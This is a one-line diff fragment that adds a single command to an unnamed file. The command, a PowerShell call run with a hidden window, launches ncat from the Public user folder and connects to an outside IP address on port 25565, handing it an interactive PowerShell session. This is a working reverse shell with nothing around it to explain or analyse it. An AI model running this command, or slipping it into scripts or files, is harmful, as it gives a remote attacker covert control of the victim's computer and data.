@@ -1,0 +1,1 @@
+﻿powershell.exe -WindowStyle Hidden {C:\Users\Public\ncat.exe 69.154.16.149 25565 -e powershell.exe}
